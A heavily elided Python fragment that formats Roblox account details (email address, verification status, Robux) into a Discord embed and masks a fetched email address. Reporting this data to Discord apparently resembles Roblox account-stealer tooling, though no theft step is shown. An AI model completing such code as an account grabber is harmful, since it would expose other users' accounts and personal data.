            ...
            'embeds': [
                {
                    ...
                    'fields': [
                        ...
                        {
                            'name': '📧 Email Status',
                            'value': f"**Address:** {user_info.get('email_address', 'Not available')}\n**Verified:** {user_info.get('email_verified', '❌')}",
                            'inline': False
                        },
                        {
                            'name': '💰 Robux',
        ...
        if response.status_code == 200:
            ...
            try:
                ...
                if email_response.status_code == 200:
                    ...
                    # Get current email address (masked for privacy)
                    current_email = email_data.get('emailAddress', 'Not available')
                    if current_email and current_email != 'Not available':
                        ...
                        if len(email_parts) == 2:
                            ...
                            if len(username_part) > 2:
                                masked_username = username_part[:2] + '***'
                            else:
                                masked_username = '***'
                            email_address = f"{masked_username}@{domain_part}"
                        else:
